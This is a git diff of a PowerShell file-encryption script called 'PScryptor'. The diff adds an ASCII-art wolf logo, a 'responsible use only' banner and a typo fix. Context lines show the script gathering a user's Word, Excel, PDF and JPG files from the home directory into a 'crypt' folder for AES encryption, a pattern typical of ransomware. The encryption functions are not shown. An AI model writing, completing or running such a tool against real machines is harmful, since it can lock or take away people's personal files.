@@ -10,9 +10,79 @@ Encrypts files using an AES key.
 Thanks to Tyler Siegrist for the AES Ket genorstor and Encryption function
 Author of AES Key and Encrption functions: Tyler Siegrist
 
-Aythor of PScryptor script @cyberw01f
+Author of PScryptor script @cyberw01f
 
 #>
+$logo = @"
+	=================================================================
+						_                         ___  _  __ 
+			 ___ _   _| |__   ___ _ ____      __/ _ \/ |/ _|
+			/ __| | | | '_ \ / _ \ '__\ \ /\ / / | | | | |_ 
+		   | (__| |_| | |_) |  __/ |   \ V  V /| |_| | |  _|
+			\___|\__, |_.__/ \___|_|    \_/\_/  \___/|_|_|  
+				|___/                                      
+		
+	==================================================================
+		,%#((%                                             %%%%%.
+		%(%%,#%((%                                       %%%%%,&%%%               
+		&(#(    /(&%%                                   &%%&*    #%%&              
+		%%%*       .&%%#                               %%%&        #&%%                 
+		,%%%          ,&%%                             %%%,          &%%               
+		%%%             %%%,                         ,%%%             %%%                          
+		%%%              %%%*                       *%%%              &%%                            
+		,%%,         /%%#  %%%                       %%&  #%%/         ,%%,                           
+		#%%           &%%.  %#%&&%%%%%%%%%%%%%%%&%%&%%%  /%%%           %%(                           
+		(%%            %%%  .%%%&%*.       .*#&%&%%%.  %%%            %%(;)                              
+		,%%*            %%%  %%%                   %&&  %%%            *%%                               
+		%%%            %&%                             &%&            &%%                                  
+	   &%%                                                           %%&                                    
+	   *%%%                                                         %%%                                      
+		%%%                                                         %%%                                       
+		 &%%                                                       &%%                                         
+		 .%%%                                                     %%%.                                          
+		  ,%%%                                                   %%%.                                            
+		   %%%                                                   %%%                                            
+		 .%%%                                                     %%%.                                            
+		,&%%      .%%%%%%%%%%%#                 *&(%%(%(%%%&.      %%%,                                            
+		%%%       %%%%%%%%%%%%%&/             /((&(&(%((%%%%%       %%%                                            
+	   %%%              &%%&%%%%%&           &%&((((((&              %%%                                            
+	  %(&.                &%%%,%%%           %%%,%%%%                 %%%                                           
+	  %#(                      %%%           %%%                      %%%                                           
+	 #%%                       %%%           %%%                       &%&                                         
+	 &%%                       %%%           %%%                       %%%                                         
+	 %%(                       %%%           &%%                       %%%                                         
+	,%%,                       %%&           %%%                       (%%,                                        
+	 %%%%                                                             %%%%                                         
+	   &%%.                                                         .%%%                                           
+		%%%%               %%%    #%%%%%%%%%#    %%%               %%%%                                            
+		 ,%%%              %#%/  %%&/.....(%%%  /%%%              &%%,                                             
+		   &%%              %%%   %%%     %%%   %%&              %%%                                               
+			&%%              &%%  ,%%&,,,%&%,  %%%              %%%                                                
+			 %%%  ,&,         %%%  .&%%%&%&.  &%%         ,&,  &%%                                                     
+			 .%%%%%%%%        ,%%%           %%%,        (%%%%%%%.                                                 
+			  *(*  .%%%        /%%%%%%%%%%%%%%&.        (%%.  /&(                                                     
+					 %%%          #&&&&&&&&          %%%                                                           
+					  %%%                             %%%                                                           
+					   &%%                           %#%                                                             
+					   %%%(  (%%               #((  /%%/                                                            
+						%%&%%%%%&             %%%%%%%%%                                                             
+						*%%(   %%         %%%%   (%%*                                                            
+								#%%%       &%%#                                                                   
+								  %%&     %%%                                                                     
+								   %%%   %%%                                                                     
+									%%% %%%                                                                     
+									 %%%%%                                                                     
+									 #%%%#                                                                    
+									  %%&  
+									   . 
+								   @cyberw01f
+"@
+
+$label = @"  
+                   PowerShell File Encryption Script  
+                    Resppnsible use only spermited
+"@
+
 function Create-AESKey() {
 
     Param(
@@ -160,6 +230,9 @@ Function Encrypt-File
     $Result | Add-Member –MemberType NoteProperty –Name Files –Value $EncryptedFiles
     return $Result
 }
+Write-Host -f Magenta $logo
+Write-Host
+Write-Host -f Green $label
 New-Item -ItemType "directory" -Path $Env:HomePath\crypt 
 $files = Get-ChildItem -Recurse -Include *.doc, *.docx, *.xls, *.xlsx, *.pdf, *.jpg $Env:HomePath 
 Copy-Item -Path $files -Destination $Env:HomePath\crypt;
